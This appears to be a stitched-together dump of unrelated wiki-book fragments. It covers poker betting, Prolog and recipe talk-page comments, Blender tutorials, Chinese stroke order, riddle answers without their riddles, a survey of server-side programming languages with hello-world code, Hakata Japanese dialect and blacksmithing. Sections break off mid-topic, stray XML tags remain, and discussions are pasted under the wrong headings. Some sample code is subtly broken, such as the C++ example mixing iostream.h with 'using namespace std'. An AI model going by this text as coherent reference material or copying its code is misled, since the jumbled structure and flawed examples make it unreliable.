      <text xml:space="preserve">== Betting ==
Specifics of betting vary from game to game. Before a hand begins, most games either use an ''ante'' or a ''blind bet'', and some games use both. An ante is usually a fraction of a normal bet size. Blind bets are used with games that have a ''dealer button'' (also called a ''puck'' or ''button''), hereafter simply ''button'' to refer to both the button itself and to the player who holds it. With an ante, every player must toss a chip or coin of a given denomination into the pot before receiving his or her cards. Blind bets may also appear in the form of ''bring-in'' bets in stud games, where the player with the lowest (or highest) card showing on the first round must either &quot;bring it in&quot; for a set amount (usually half a small bet) or make a full small bet. The player making the bring-in cannot fold.

In games that use a dealer button, the most common structure is a two-blind structure. In this, the player to the button's left posts a ''small blind'' (usually half a bet, rounded either up or down if this results in an awkward bet size), and the person to the left of the small blind posts the ''big blind'', generally a full bet size. The players then all receive their cards, the other players receiving them at no cost. The player to the big blind's left must then call, raise, or fold to the big blind, and betting continues normally. But what is normally?

In a normal betting round, there must be some means of determining who goes first. In games that use a button, it will always be the player to the button's left (except in the first betting round, in which case it is the player to the big blind's left; this position is called ''under the gun''). Other games use various schemes. The player who goes first must check or bet. To ''check'' is to pass on the chance of betting, and the player to his or her left faces the same choice. If all players check, nobody may bet and the next round continues. When somebody bets, all other players must decide, one at a time (starting from the bettor's left) whether to call, raise, or fold. To ''call'' the bet is to put the same amount of money into the pot. To ''raise'' is to call and also add ''more'' money to the pot. To ''fold'' (''lay down your hand'') is to stop playing the hand, giving up any money invested in the pot. The round of betting ends when all players who have not folded have called the last raise (so each player who has not folded contributes the same amount to the pot). A player who bets and folds to a raise loses the bet he or she made, even though the player folded on the same betting round. For this reason, it is advantageous to act last; in a game with a dealer button, the player who has the button always acts last (except in the first betting round, since the blinds get the option to raise).

To confuse matters further, there are several ways to play betting rounds, which are usually unrelated to the game itself (for example, [[../Five card draw|five card draw]] can be played spread limit, fixed limit, pot limit, or no limit).
* ''Spread limit'', also called ''straight limit'', is a common method in home games: throughout a hand, there is a lower limit and an upper limit, for example, $1 to $5, and these limits usually do not change. Spread limit is rarely found in casinos.
* ''Fixed limit'' means each bet and raise is a fixed size. A fixed limit table usually doubles the bet size for the last couple of betting rounds, so fixed limits are often described as, say, $2/4, which, if it describes a Texas hold'em game, means the small blind is $1 (half the big blind), the big blind is $2, the flop is $2, the turn is $4, and the river is $4.
* ''Pot limit'' is like spread limit except the maximum bet size is always the size of the pot. Like fixed limit, the minimum bet size is often doubled at a certain point.
* ''No limit'' means there is no upper limit at all, although this is almost always combined with a rule (called &quot;table stakes&quot;) that you can only bet with chips that were in play at the beginning of the hand. This means that when you start a hand of no limit poker, you know that your maximum exposure to risk is limited to the value of chips in front of you. Like fixed limit, the minimum bet size is often doubled at a certain point.

[[../Omaha|Omaha hold'em]] is often played pot limit but is almost never played no limit. Stud poker is usually either spread limit or fixed limit. A beginning player is strongly urged ''not'' to play pot limit or no limit, no matter how low the stakes are, until at the very least the player is well acquainted with the rules to the game.

=== The purpose of forced bets ===
All serious poker games involve some element of forced bets. As described above, this can have take several forms, but will always involve at least one player being forced to put money in the pot. Why is this so important to a poker game?

Consider a game of poker where there are no forced bets. Since you can look at your hand before you choose whether to bet, there's no point in putting any money on the table unless you're almost certain that your hand will be a winner. You might fold 99 hands out of 100 and still make a profit. Of course, your opponents, if they are rational, will think and bet exactly the same way. Such a poker game would consist of hand after hand where everyone folded, and the occasional hand where one person bet and everyone else folded. Money would only change hands on the very rare occasions when two people got extremely good hands at the same time.

To counter this, poker games have a forced bet element. If you fold too many hands, you'll end up losing out as you'll pay the forced bets but get very few payoffs to justify the money expended. Forced bets provide a reason for you to bet even if the forced bet hasn't come out of your stack (as is the case in most hands when blind bets are being used): since the player who made the forced bet may have any hand at all, you have a good chance of beating them with any hand that is above average.

The opposite problem can happen if the forced bets are too large. If you are in a game where the ante is half your entire stack, you'll play almost any hand since you'll go bust in a couple of hands anyway. In general it's correct to play more loosely (call and bet with a wider range of cards) the higher the forced bets are relative to the average stack size.

This can be used in tournament play to control the length of the tournament. As the tournament progresses, the size of the blinds is increased so that players are forced to play their hands more aggressively or risk going bust just from paying the blinds.

== Variations between compilers ==

Would it be a good idea to add differences between different compilers? Or at least a note that there might be differences?

For example, I use the Windows port of the GNU Prolog compiler. After it iterates through all the possible results, it answers &quot;yes&quot; instead of &quot;No&quot; if there is more than one result.

This might be confusing to some. Thoughts?

== Hello, Person! ==

I think it would be nice to have a program that asks the person his/her name, '''inputs the string''', and replies with 'Hello, ', Person, '!'. I learned prolog 20 years ago, I could write this, but now it seems that I can't - there's no way I can input a string in prolog :-/ [[User:Albmont|Albmont]] ([[User talk:Albmont|talk]]) 14:24, 21 July 2008 (UTC)

== binding inconsistency ==
Are ''binding, unification,'' and ''instantiation'' all clearly differentiated and used consistently? E.g.,&lt;br/&gt;
&quot;Prolog will try to '''bind''' a term to the variable.&quot; &lt;br/&gt;
&quot;In the example above, prolog will first find human(david) in the program and ''unify'' A with david&quot;

I'm not sure as I haven't created this recipe but it would make sense to add the milk with the eggs

:After looking at the page's history, I noted that the recipe wasn't complete when we got it.  Maybe someone should play in the kitchen to determine what works and what doesn't. [[User:Gentgeen|Gentgeen]] 04:35, 6 Mar 2005 (UTC)

::I've looked at a few pictures of Mille Crepes and it looks like it's just a bunch of layers of crepes, with filling of some sort in between. In one picture I saw fruits inside. So, it seems pretty simple to make. I'll go digging for a recipe for this from a book.

==Sizes / multiple sheets?==

Uh so this doesn't make any kind of sense:

&quot;Trim the pastry so that you are left with a rectangle approximately 23 x 25.5 cm. Roll out the larger piece of pastry to a 30cm square...&quot;

The first bit makes it sounds as though you are dealing with one piece of puff pastry. The second step, by saying &quot;the larger piece,&quot; makes it sound as if there are two. And if you're going to be rolling it out to a specified dimension, why measure it so precisely - or trim it - when it's in its pre-rolled state? Am I missing something obvious, or has a step been omitted / added wrongly here? [[User:Jessicapierce|Jessicapierce]] 01:02, 3 May 2007 (UTC)</text>

      <text xml:space="preserve">SOS in WWII was primarily made with ground meat not dried chipped beef. The dried chipped beef was a Naval meal called foreskins on toast. There was more room to carry dried and smoked meats on ships and subs then there was for fresh meat.

Shouldn't this be in odds and ends.

Check out this article: http://www.seabeecook.com/cookery/cooking/cooking_sos.htm

It's not clear to me that cooks generally prepared SOS according to the 1910 recipe, even though it was in the book until 1944.  For one thing, it sounds like many/most cooks knew to soak the beef before using it, so that it wouldn't be incredibly salty.  For another, later recipes were creamier, and it's not clear to me whether that was because the standard practice was not to follow the book recipe, and eventually the book was updated, or if most cooks did make it according to the 1910 recipe (but likely with soaking to reduce salt) until 1944.

Is it 1/4 ounce pepper, that is 7g or 1/4 pound for 110g ? I'd rather bet the former !</text>

One of Blender's powerful features is its Python API. This allows you to interface with Blender through the Python programming language. The Python interface allows you to control almost all aspects of Blender, for example you can write import or export scripts for meshes and materials of various formats or create procedurally generated textures. You can also create complete animations procedurally and write scripts to modify existing scenes in any way you can think of. On top of all, you can easily create a user interface for your script, transforming it into a generally usable tool.

The relevant section of the Blender User’s Manual is [http://wiki.blender.org/index.php/Doc:2.6/Manual/Extensions/Python here].

Download Python Scripts from the Blender site [http://wiki.blender.org/index.php/Extensions:Py/Scripts/Catalog here].

[http://blenderartists.org/forum/forumdisplay.php?f=11 This forum] on blenderartists.org discusses Python scripting.

      <text xml:space="preserve">Generally speaking, the strokes in Chinese characters are written from top to bottom, left to right.

==Chinese Characters==
There are several stroke order rules for Chinese characters: top to bottom, left to right, inside to outside.
For example, the Chinese character for &quot;hit&quot;, 打, the left part is written from top to bottom, then the right part is written from top to bottom.  The order in which the characters are written can be expressed through drawing a tree diagram.
An example of inside to outside stroke order is in the character for &quot;round&quot;, 圓.  The top two strokes of the box on the outside is written first (because of top to bottom order), then the inside is written top to bottom, and the bottom horizontal stroke is written last to enclose it.

=== Exceptions ===
There are many stroke order exceptions in Chinese orthography.
For example in the character &quot;上&quot;, meaning &quot;up&quot;, the middle horizontal line is written first, then the vertical stroke, then the bottom stroke.  This is an exception to the left to right stroke order rule.

#She is a music box
#She is on life support in a hospital and the power fails.
#She was a tight rope walker who did her act blindfolded. She knew she reached the opposite end of the rope when the band that was beneath her stopped playing. However, one day the lead conducter was sick, and the replacement did not know the trick. So when he stopped (early), the tight rope walker thought she had reached the end and walked off to her death.
#She was a bug at a party. She was sitting on a chair that people were using for musical chairs, and when the music stopped, a child sat on her.
#She was driving in a car listening to the radio. She crashed into a cement pole. The radio, being closer to the front of the car, was destroyed a split second before she was.
#She was the musician. And had a heart attack.

#His parachute did not open.
#He was hiking and ran out of food.
#He was poisoned.
#Random heart attack
#The man was actually Abraham Lincoln and 'the field' is the nickname for the theater he was in during his assassination. There is no one else in 'the field' because the theater was evacuated. The rucksack on his back was a late 1850's man-purse that was common during that era for theater-goers.

&lt;/table&gt;
&lt;/div&gt;

Choosing the right programming language ''for server-side applications''.
(Choosing the right programming language for browser-site rollovers, animation, and validation -- CSS, JavaScript, Java, or Flash -- is discussed ... &lt;!-- where? --&gt; ...).

When it comes to the perfect programming language for the development of your site, it is imperative that you understand that '''there is no perfect programming language'''. Once you understand this, it is simply a matter of choosing the language that best serves your needs. Before you decide on what language to use, you should consider the following

*your server platform
*the server software you run
*your budget
*previous experience in programming
*the database you have chosen for your backend

The Operating system you are running on your system is your platform and your choice of OS may play a major part in the language you choose. Be aware that unforeseen problems may push you to change platforms in the future, and that some language choices will make this very painful. Microsoft Windows and POSIX-compliant unix-like systems will most likely be your two main choices in technology. 

Once you have chosen your OS, the next choice is your server software. On Windows systems, you have IIS which comes installed for free with windows. It has a long history of performance and security problems. Many of the web servers commonly used on POSIX-compliant unix-like systems are available for Windows too, including the very popular and well-respected Apache web server.

&quot;POSIX-compliant unix-like systems&quot; includes a plethora of available OSes including but not limited to Linux, Sun Solaris, BSD, and Mac OS X. Apache is by far the most common web server for these systems and for web serving in general.

While some of the available programming languages are free under the GNU Public License or other open-source licences, others are commercial products and carry a licensing fee. The commercial products do carry the advantage of commercial support and tighter integration with the companies' other products, so if you have a large amount of capital and want to get your site set up quickly with little configuration, then a commercial solution might be your better option. Some of us, however, cannot afford the high price tag of the commercial solutions on the market and may elect to make use of the free yet still very powerful languages available. The tradeoff is the effort in properly configuring the environment which may or may not be worth the cost savings.

== The Most Popular Programming Languages ==

The following are a list of the most popular languages used in the industry today. This is by no means exhaustive or complete and it is up to you to personally research each option to choose the right language for you.


=== Java/Servlet/JSP ===
*Type: Interpreted or Compiled (for Virtual Machine)
*website: [http://www.Java.sun.com Sun Microsystems]
*License: --------- 

Java is a powerful,open source,robust and secure web-based program that can run as standalone program or an applet embedded in a website.

Servlets (controller), JSP (view), Java (model) creates web-based applications using MVC ({{wp|Model–view–controller}}).
For creating robust secure web-application Java has many frameworks like [http://en.wikipedia.org/wiki/Apache_Struts Struts],[http://en.wikipedia.org/wiki/Spring_Framework Spring] and more in [http://en.wikipedia.org/wiki/Comparison_of_web_application_frameworks web_application_frameworks].

'''Example code'''
&lt;source lang=Java&gt;class HelloTest {
  public static void main(String[] args) {
    System.out.println(&quot;Content-type: text/html\n&quot;);
    System.out.println(&quot;Hello World!&quot;); //Display the string.   
  }
}
&lt;/source&gt;

[http://Java.sun.com/docs/books/tutorial/index.html The Java Tutorial]

JavaServer Pages (JSPs) are web pages with embedded Java code.  The embedded Java code is executed on the server, then the page is returned to the browser for display.

'''Example code'''
&lt;source lang=Java&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;A JSP Example&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;% out.println(&quot;&lt;p&gt;Hello there!&lt;/p&gt;&quot;); %&gt;
  &lt;/body&gt;
&lt;/html&gt;
&lt;/source&gt;

=== Perl ===
*Type: Interpreted script language, Compilable into binary executable or platform-compatible Bytecode
*website: [http://www.perl.com perl.com]
*License: Open source [free]

insert content here

'''Example code''' (using [http://www.perldancer.org/ Dancer] Perl framework)
&lt;source lang=perl&gt;#!/usr/bin/env perl
use Dancer;
get '/' =&gt; sub
 {
  &quot;Hello World!&quot;
 };
dance;
&lt;/source&gt;


=== PHP ===
*Type: Interpreted script language, Compilable
*Website: [http://www.php.net php.net]
*License: Open source [free]

PHP is a recursive acronym for PHP Hypertext Processor. Unlike the other offerings listed, PHP is designed specifically for server-side programming, which means that its library is specialized for the tasks you'll be doing over and over again in the course of programming your website. PHP also has the advantage of being able to interweave code with HTML, thus allowing you to mix layout with programming. While this may simplify coding for small sites, it does carry the potential to be abused, resulting in difficult to manage or maintain code for larger projects. Proper use of a templating system such as [http://smarty.php.net/ Smarty] should do wonders towards preventing that. PHP is available for most operating systems including Unix and Windows, and is an excellent server-side programming language for professional programming.

'''Example code'''
&lt;source lang=php&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;PHP Hello World&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;?php echo &quot;hello world&quot;; ?&gt;
    &lt;/body&gt;
&lt;/html&gt;
&lt;/source&gt;

Or a feature that really shows that PHP is designed for the web is something like this.

&lt;source lang=php&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;PHP Hello World&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;?php
        if(isset($_GET['showHtml']))
        {
             ?&gt;
             &lt;h1&gt;The GET variable showHtml is set.&lt;/h1&gt;
             &lt;?php
        }
        ?&gt;
    &lt;/body&gt;
&lt;/html&gt;
&lt;/source&gt;

In this case if &quot;showHtml&quot; is set, the code will display the h1. This way you will not have to use echo or print to print HTML.

=== C ===
*Type: Compiled
*Website:
*License:

The C programming language is a standardized programming language developed in the early 1970s by Ken Thompson and Dennis Ritchie for use on the UNIX operating system. It has since spread to many other operating systems, and is one of the most widely used programming languages. C is prized for its efficiency, and is the most popular programming language for writing system software, though it is also used for writing applications.

C is a useful language to learn since similar syntax is used by many modern languages such as Java, PHP, and JavaScript.

'''Example code'''
&lt;source lang=c&gt;
#include &lt;stdio.h&gt;
int main() {
   printf(&quot;Content-Type: text/html\r\n\r\n&quot;);
   printf(&quot;&lt;html&gt; &lt;head&gt;\n&quot;);
   printf(&quot;&lt;title&gt;Hello, World!&lt;/title&gt;\n&quot;);
   printf(&quot;&lt;/head&gt;\n&quot;);
   printf(&quot;&lt;body&gt;\n&quot;);
   printf(&quot;&lt;h1&gt;Hello, World!&lt;/h1&gt;\n&quot;);
   printf(&quot;&lt;/body&gt; &lt;/html&gt;\n&quot;);
}
&lt;/source&gt;

'''More Example code'''
&lt;source lang=c&gt;
#include &lt;stdio.h&gt;

int main() {
    show();
}

void show() {
    printf(&quot;hello&quot;);
}
&lt;/source&gt;

=== C++ ===
*Type: Compiled
*Website: http://www.research.att.com/~bs/C++.html
*License:

Originally released as &quot;C with Classes&quot; around 1982, C++ was designed by Bjarne Stroustrop to be a superset of C. With its compatibility with C, it became quite popular. In 1983 C with Classes was revised and renamed C++. It was summarized in the book, &quot;The C++ Programming Language&quot; by Stroustrop, Addison Wesley, 1985. The goal was to add programming language features that support data abstraction and object-oriented concepts to C. In 1990 the book entitled &quot;The Annotated C++ Reference Manual,&quot; by Ellis and Stroustrop, Addison Wesley became the defining document.

'''Example code'''
&lt;source lang=c&gt;
#include &lt;iostream.h&gt;
using namespace std;
int main() {
   cout &lt;&lt; &quot;Content-Type: text/html\r\n\r\n&quot;;
   cout &lt;&lt; &quot;&lt;html&gt; &lt;head&gt;\n&quot;;
   cout &lt;&lt; &quot;&lt;title&gt;Hello, World!&lt;/title&gt;\n&quot;;
   cout &lt;&lt; &quot;&lt;/head&gt;\n&quot;;
   cout &lt;&lt; &quot;&lt;body&gt;\n&quot;;
   cout &lt;&lt; &quot;&lt;h1&gt;Hello, World!&lt;/h1&gt;\n&quot;;
   cout &lt;&lt; &quot;&lt;/body&gt; &lt;/html&gt;\n&quot;;
   return 0;
}
&lt;/source&gt;

=== ColdFusion ===
*Website: [http://www.adobe.com Adobe]
*License: Multiple available [http://www.adobe.com/products/coldfusion/]

[[Programming:ColdFusion]]

ColdFusion is a scripting language based on standard HTML that is used to write dynamic Web sites. It allows you create dynamic pages quickly and easily, including querying data from a database, use hundreds of built in tags and functions, or creating full scale object oriented enterprise level applications. ColdFusion pages can consist largely of standard HTML tags intermingled with ColdFusion Markup Language (CFML) tags, or can implement custom frameworks designed to assist the developer in separating presentation from business logic (e.g. with the MVC design pattern).  ColdFusion was introduced by Allaire in 1996 and acquired by Macromedia in a merger in April 2001 and by Adobe in 2005.  As an Adobe product, ColdFusion developers have the advantage of leveraging many existing Adobe technologies seamlessly.  Examples of such integration can be seen in the dynamic generation of Adobe Acrobat .pdf documents, Adobe Flash forms and presentations, Adobe Flash remoting capabilities, as well as connection with Adobe Flex user interfaces.

'''Example code'''
&lt;pre&gt;
&lt;html&gt;
&lt;body&gt;
&lt;cfset myVar = &quot;Hello World!&quot;&gt;
 &lt;cfoutput&gt;
	#myVar#
 &lt;/cfoutput&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;/pre&gt;


=== ASP ===
*Website: [http://www.microsoft.com Microsoft]
*License: ---------

ASP, or Active Server Pages combine html and server-side code (processed on the server and displayed as html) to create webpages with embedded functionality and scripts (see the code example).

'''Example code'''
&lt;source lang=asp&gt;
&lt;html&gt;
&lt;body&gt;

&lt;%
dim name
name=&quot;Donald Duck&quot;
response.write(&quot;My name is: &quot; &amp; name)
%&gt;

&lt;/body&gt;
&lt;/html&gt;
&lt;/source&gt;


=== C# ===
*Type: Compiled (for Virtual Machine)
*website: [http://www.microsoft.com Microsoft]
*License: ---------

C# (pronounced &quot;C Sharp&quot;) is a multi-paradigm programming language encompassing imperative, functional, generic, object-oriented (class-based), and component-oriented programming disciplines. It was developed by Microsoft within the .NET initiative and later approved as a standard by Ecma (ECMA-334) and ISO (ISO/IEC 23270). C# is one of the programming languages designed for the Common Language Infrastructure.

C# is intended to be a simple, modern, general-purpose, object-oriented programming language. Its development team is led by Anders Hejlsberg, the designer of Borland's Turbo Pascal. It has an object-oriented syntax based on C++. It was initially named Cool, which stood for &quot;C-like Object Oriented Language&quot;.[2] However, in July 2000, when Microsoft made the project public, the name of the programming language was given as C#. The most recent version of the language is 4.5 which was released in 2012.

'''Example code'''
&lt;source lang=c&gt;
class ExampleClass
{
    static void Main()
    {
        System.Console.WriteLine(&quot;Hello, world!&quot;);
    }
}
&lt;/source&gt;


===WebDNA===
*Type: Interpreted script language with built-in database system
*Website: [http://www.webdna.us www.webdna.us]
*License: Freeware

WebDNA is an easy to learn language with hybrid [http://en.wikipedia.org/wiki/In_memory_database in-memory databases] specifically designed for server-side programming. It uses a relatively small set of instructions that can be combined to build sophisticated database-driven websites. WebDNA code can interweaves with css, html, html5 and ajax, allowing to mix layout with programming and sever-side with client-side. Some instructions allow to interact with remote servers.

WebDNA is available for most operating systems including Unix, OS X and Windows.

'''Example code''' (connects to a whois server and shows the information)
&lt;pre&gt;
&lt;!--HAS_WEBDNA_TAGS--&gt;
&lt;html&gt;
   &lt;head&gt;
      &lt;title&gt;WebDNA example 1&lt;/title&gt;
   &lt;/head&gt;
&lt;body&gt;

[text]info=[tcpconnect host=whois.domaindiscover.com&amp;port=43]
[tcpsend]webdna.us[unurl]%0D%0A[/unurl][/tcpsend]
[/tcpconnect][/text]

&lt;/body&gt;
&lt;/html&gt;
&lt;/pre&gt;

'''Example code''' (store the previous information in a database)
&lt;pre&gt;
&lt;!--HAS_WEBDNA_TAGS--&gt;
&lt;html&gt;
   &lt;head&gt;
      &lt;title&gt;WebDNA example 2&lt;/title&gt;
   &lt;/head&gt;
&lt;body&gt;

[append db=base.db]domain=webdna.us&amp;whois=[info]
[/append]

&lt;/body&gt;
&lt;/html&gt;

Once you have chosen an appropriate language (''see 5.3: Choosing the right programming language''), it is important to code your website well. Cleanliness is both important and respected among programmers, and an effective, efficient algorithm will be appreciated by the end users.

You should '''plan the logical layout''' of your website code beforehand, with the methods, objects, etc., and their purposes clearly defined and related. Be precise with this pre-planning. Draw it on a napkin, type it out, do whatever you have to to get a concrete understanding of your backend's structure beforehand. This will come in handy. Oftentimes, programmers say that planning is the most important stage of programming (that and bug-testing).

Aside from planning ahead, here are some other general guidelines:

*'''Keep an online manual for your language open''' at the same time you're coding, in case you need to look up an obscure function or precise syntax.
*Be sure to '''never use outdated algorithms''' or tags. Tags like &lt;nowiki&gt;&lt;marquee&gt; and &lt;font&gt;&lt;/nowiki&gt; are no longer standard HTML tags. Syntax for languages is always being updated. Make sure you're coding in the most recent version of the language. Backwards and forwards compatibility are important. Don't use code that is already outdated, and if the manual says a function will probably be discarded in a future update, don't use it.
*It's important to '''comment''' your code, in case someone else takes over for you at some point. This is also important for when you have to update your code in the future, in case you forget your own logic.
*Make your code '''abstract''', in case the same method needs to be implemented in more than one place.
*Any other general standards for coding well should be used.

In conclusion, '''plan ahead'''. It's much better to spend five minutes planning ahead than to spend hours going back through your code because you made a logistical mistake in the very beginning.

== Java and JSP ==
Sun Microsystems has published a widely used set of coding conventions for [http://java.sun.com/docs/codeconv/ Java] and [http://java.sun.com/developer/technicalArticles/javaserverpages/code_convention/index.html JSP].

A very good automated tool for enforcing Java coding conventions is [http://checkstyle.sourceforge.net/ checkstyle]. This tool is highly configurable.

Existing code can be reformatted using tools such as [http://jalopy.sourceforge.net/ Jalopy] or [http://www.tiobe.com/jacobe.htm Jacobe].

Use the javadoc tool included in the Java SDK to document your code.

Automated unit tests can be built using [http://junit.sourceforge.net/ Junit]. [http://www.junitdoclet.org/ JUnitDoclet] is a useful addition to JUnit. Use [http://httpunit.sourceforge.net/ HttpUnit] to automate web page testing.

All the tasks above can be integrated using [http://ant.apache.org/ ANT].

== Amaterasu legend ==

I've [http://en.wikibooks.org/w/index.php?title=Japanese/Numbers&amp;diff=1463829&amp;oldid=1463696 removed] the following from the page:
: There is a legend that the sun goddess [[Wikipedia:Amaterasu|Amaterasu]] once hid herself in a cave, which led to darkness on Earth. Trying to get her back, other gods gathered around the cave and decided that another goddess should perform a ritual dancing to make Amaterasu wonder what is happening outside, and step out of the cave. During this ritual, a god Ame no Koyate no Mikoto prayed for Amaterasu to come out. He said &quot;ひ&quot; and other gods replied &quot;とつ&quot;, he said &quot;ふ&quot; and other continued &quot;たつ&quot;, he said &quot;み&quot;, and they added &quot;つ&quot;. Then the same answer was for &quot;と&quot;, &quot;いつ&quot;, &quot;む&quot;, &quot;なな&quot;, &quot;や&quot; and &quot;ここの&quot;. The last word all the gods said together: &quot;とを&quot;.
:The origin of these words are a mystery, but some scholars believe they have Hebrew roots, and even attempt (rather successfully) to translate them like if they were said in Hebrew.{{citation needed}}
:These words became the first Japanese counting words. Their reading is called kunyomi (訓読み, くんよみ) and they are now pronounced as:

A website should have a unified graphic theme, as well as a tone and general '''feel'''. If a &quot;professional feel&quot; is what you're going for&amp;mdash;if you're trying to sell a professional product or service, like web design&amp;mdash;then aim for a professional look and design, and write the content with a professional tone. It's hard to describe because the concepts are often abstract, but a good designer can come up with a look and feel for any theme.

Besides helping the user subconciously identify your website with a general category (professional, playful, serious, etc.), it's important to have a unified theme so that the user knows when they're actually at your website. That is, from a cognitive psychological view: if a user clicks a link, he should know whether he is still at your website or if the link has taken him to an external site.

Distinct and unique &quot;logo types&quot; (amazon.com, ebay, Microsoft, RollingStone Magazine) stay with a user. They are instantly recognizable and also lend an appropriate air to the content they represent.

It can take a long time to develop and decide upon a theme, but the visual aspect of a website is just as important as the backend and is an essential part of the user's experience.

      <text xml:space="preserve">You can use a clapper board to identify which scenes you wish to include. For example, you could write the TAKE number and the SCENE number, so while editing you can just select the thumbnail with the information you selected to include in your final movie, and trim the scene and add it to the final movie.
In North America, the clapper is referred to as a slate.  It's use is as follows.  The assistant cameraperson &quot;AC&quot; asks the script supervisor which scene and take is up.  This is written on the slate with either chalk or marker.  If there is sound recorded, then the clapper sticks are hit together so the editor has both a visual cue (the first film frame with the sticks together) and a sound cue (the clap).  
It is often perceived that the slate is always clapped, but for much of the film there is no sound (only necessary for synronizing the actors lips with their dialogue) and the slate is put in frame closed.
Slating is the last thing that happens before the action can start, however in some circumstances where it's unclear when the event might happen (as an explosion) the camera will be slated or &quot;marked&quot; at the end of the action, called an &quot;end-slate.&quot;

Property is both a legal concept and a social institution. This textbook focuses on the former, examining legal principles and rules regulating the creation, transfer and enforceability of interests in property. Nevertheless, it is impossible to understand property law in isolation from its historical, economic and social context. 

All human societies have rules to control access to valuable resources. These rules vary according to the nature and needs of the particular society. The rules governing property in traditional societies, for instance, differ greatly from those of contemporary societies. 

Large differences may exist between industrialized societies. The best example is the difference, until recently, between capitalist and communist societies with regard to private property. Most countries today have mixed economies in which some resources are privately owned, some assets are owned by the state and free enterprise is subjected to some state regulation. In Australia, private property predominates, though certain resources such as beaches and public parks, are treated as common property.

In Australia, private property in land was introduced in 1788, displacing systems of Aboriginal law based on common ownership. In ''Mabo v Queensland'', the High Court of Australia recognised Aboriginal customary rights to land for the first time.

      <text xml:space="preserve">These examples are mainly from Hakata-ben (Fukuoka dialect).


ano sa instead of ano ne (hey, listen up...) 

asoban instead of asobou (let's play) 

batten instead of da kedo (but) 

da ken instead of da kedo (but) 

yokaroumon instead of deshou (good, don't you think?) 

bari instead of totemo (very) 

shitoocchan instead of shiterunda (I'm doing it) 

~shitookiyo instead of shite kinasai (please do ~; used with children) 

tottouto instead of tottimasu (to take) 

yokka yokka instead of sou desu ne (yeah; is that so?)


To form affirmative sentences, add ~bai to end of the standard Japanese sentence. 
Kore wa enpitsu desu. = Kore wa enpitsu bai. (This is a pencil.) 

To form interrogative sentences, add ~to to end of the standard Japanese sentence. 
Sore wa pen desu ka? = Sore wa pen to? (Is that a pen?) 

For adjectives only, change the last ~i of the adjective to ~ka when expressing one word. 
Sore wa minikui. = Sore wa miniku ka. (That's ugly.) 

For adjectives in a sentence, add ~ken to end of adjectives. 
Kyou wa samui desu. = Kyou wa samui ken. (Today is cold.) 

Useful words: 
me = uchi 
you = aatan 
no = innya 
yes = yoka


I like Hakata ben.
=Hakata ben suitoh. (in Hakata ben)

Kagoshima ben is difficult.
=Kagoshima ben'na mutsukashika. (in old Hakata ben)

I will be right there!
=ima kara kukken!

Short Description: RVK tutorial

*Letters in brackets i.e.:(z) mean there is addition information at the bottom of the page.

== Introduction: ==
This tutorial is meant to stop all the RVK (Relative Vertex Keys) questions.

== Window Layout: ==
Set the left half of the screen as 3D View. The other half is divided in two. The top is Action and the bottom is IPO (set to vertex display).


== Setting your Neutral Pose ==
Make sure you are on the first frame (a).
With the cursor over the 3D View, select the mesh you want to animate. (mesh in object mode) and press the I key. Select Mesh from the pop up menu then Relative Keys from the next pop up menu. A line will appear in the IPO view. This line is your neutral pose.

== Setting up your additional Pose Lines ==
Now, figure out how many key frames you will need. If you want to move both eyebrows up and down then you will need 4 additional IPO lines.

Left Brow Up
Left Brow Down
Right Brow Up
Right Brow Down

Press the up arrow (cursor key) to move to forward 10 frames. Press the I key while over the 3D View and select Mesh. Repeat until you see a total of 5 lines in the IPO window.

== Set your Poses ==
Right click on the Neutral pose line in the IPO window. This sets the mesh to the neutral pose.
Now Right click on the next line up in the IPO window. Enter edit mode in the 3D View and move the vertices as desired (in this case you will be moving verts to get the left Brow up pose). Press Tab to exit edit mode. Now right click your Neutral pose line in the IPO window. You will see your object in its neutral state. Right click the next line up and you should see the changes you just made to your object. Set up all your mesh poses following the above instructions.

== Name your Poses ==
RIght click on the Key names in the Action window. Change the name and click OK.

== Time to Animate (b) ==
Click on the arrow next to the Sliders text. This will give you access to the pose sliders.
Move to frame 20 to start your action. Move the pose slider but release the mouse when set to 0. Now move 10 frames forward and move the same slider to 1.00 (maximum). Use this method to set up all your actions(c). Remember to add a 0 value frame to end the pose.(d).

== Adjust your Slow in &amp; Out ==
In the IPO View select from the menu to find the IPO curves. You can get back to the Pose lines by selecting KeyIPO from the same menu. Right click the spline you want to edit and press TAB to enter edit mode. Move the handles to adjust slow in/out.(e)

(a) In this case moving to a frame has nothing to do with animation. It is done so that your pose lines are separate from each other.
(b) Select your key frame marker and use the usual commands to move &lt;g&gt; and duplicate &lt;d&gt; them.
(c) Be subtle by not pushing the slider all the way to 1.00.
(d) Try overlapping your poses.
(e) When setting slider values they can sometimes go into the negative value. This will give you weird results. Although sometimes they can make your animation more interesting. To fix this edit the IPO, select the point where the line dips below zero and press the V key. Do the same at the other end of the curve if needed.

Warning! Blender has a limit to the number of verts you can use.

To '''julienne''' a vegetable or other ingredient is to cut it into long thin matchstick-sized strips 1/16th to 1/8th of an inch wide and 2-3 inches long. A baton is larger, almost 1/4 inch wide.

To julienne a carrot, first cut it into cylindrical sections of the desired length. Trim each section so that the sides are straight and right-angled (almost like a cuboid). Slice into flat panels of desired width. Stack these panels and slice evenly into matchsticks.

Julienne is also a name given to a consomme garnished with julienned vegetables.

[[image:John Neagle 001.jpg|400px|right]]
''Down'n'Dirty Blacksmithing'' is intended to be a practical introduction to the craft of blacksmithing through the construction of a primitive forge, tools to work the metal heated in the forge, and basic projects.

We hope that this book will provide information through text and illustrations so that an individual might:

* Acquire necessary tools and materials.
* Build a primitive forge.
* Build a primitive [[/Tools, Materials, and Supplies#Anvil|anvil]].
* Successfully light a fire in the forge that will bring steel to a working temperature.
* Work steel with tools made and acquired in a series of graded exercises that will give an individual an introduction to the rudiments of blacksmithing.
* Work steel in a series of graded exercises that will continue the individual's introduction to the rudiments of blacksmithing and provide additional tools for the further exploration of the craft.

      <text xml:space="preserve">==Something==
I've had this in mind for some time.
What I'm after with this book is described in the introduction (which needs polish). 
I hope to take advantage of modules in Wikipedia on Metalwork, Forge, and Blacksmith to flesh this out quickly. The core work of this is not to write from scratch, but to create a core of one very simple way to set up a working forge and basic tools and make some simple, useful things.
